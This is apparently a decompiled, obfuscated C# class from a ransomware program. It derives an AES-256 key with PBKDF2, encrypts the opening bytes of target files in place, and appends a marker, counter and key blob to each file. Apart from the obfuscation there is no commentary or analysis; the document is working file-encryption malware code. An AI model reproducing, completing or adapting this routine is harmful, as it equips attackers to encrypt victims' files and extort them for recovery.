using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace ovnaSovhORzB;

public static class YkOjxnmurVCfbj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] WsadWEYMhPkNa(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = lFKPhqdsTRIDxX(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes lFKPhqdsTRIDxX(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] QfkbKHDJftu(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (EEGkMyyVIDL.HTIndamVwXrIE == getString_0(107396795))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (EEGkMyyVIDL.qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(EEGkMyyVIDL.GqXvKuGfqke, getString_0(107461832) + string_0 + getString_0(107474261) + ex.Message + getString_0(107396478));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool QNMHgTJICNuFwEj(string qtBBAGkzVvLoDw, byte[] aZxQiYswrzEMHo, byte[] BPtIRqUKxRmcJT = null)
	{
		try
		{
			byte[] array = null;
			if (EEGkMyyVIDL.HTIndamVwXrIE == getString_0(107396795))
			{
				array = (EEGkMyyVIDL.DfXjMyctTQk ? Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203))) : Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(qtBBAGkzVvLoDw, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(aZxQiYswrzEMHo, 0, aZxQiYswrzEMHo.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(qtBBAGkzVvLoDw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!EEGkMyyVIDL.DfXjMyctTQk)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(BPtIRqUKxRmcJT, 0, BPtIRqUKxRmcJT.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (EEGkMyyVIDL.DfXjMyctTQk ? Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203))) : Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212))));
				FileStream fileStream2 = new FileStream(qtBBAGkzVvLoDw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(aZxQiYswrzEMHo, 0, aZxQiYswrzEMHo.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(qtBBAGkzVvLoDw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!EEGkMyyVIDL.DfXjMyctTQk)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(BPtIRqUKxRmcJT, 0, BPtIRqUKxRmcJT.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			EEGkMyyVIDL.eHvSFFSwlBBvD++;
		}
		catch (Exception ex)
		{
			if (EEGkMyyVIDL.qphnWLJhmOUolrV)
			{
				try
				{
					File.AppendAllText(EEGkMyyVIDL.GqXvKuGfqke, getString_0(107461832) + qtBBAGkzVvLoDw + getString_0(107474226) + ex.Message + getString_0(107396478));
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (EEGkMyyVIDL.DfXjMyctTQk ? Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474203))) : Encoding.ASCII.GetBytes(EEGkMyyVIDL.DRlXtEGdcAr(EEGkMyyVIDL.jFdtIHbULOcM) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212)) + Convert.ToString(EEGkMyyVIDL.WsRteVdKTkKpED) + EEGkMyyVIDL.DRlXtEGdcAr(getString_0(107474212))));
				FileStream fileStream4 = new FileStream(qtBBAGkzVvLoDw, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(aZxQiYswrzEMHo, 0, aZxQiYswrzEMHo.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(qtBBAGkzVvLoDw, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!EEGkMyyVIDL.DfXjMyctTQk)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(BPtIRqUKxRmcJT, 0, BPtIRqUKxRmcJT.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}

	static YkOjxnmurVCfbj()
	{
		Strings.CreateGetStringDelegate(typeof(YkOjxnmurVCfbj));
	}
}
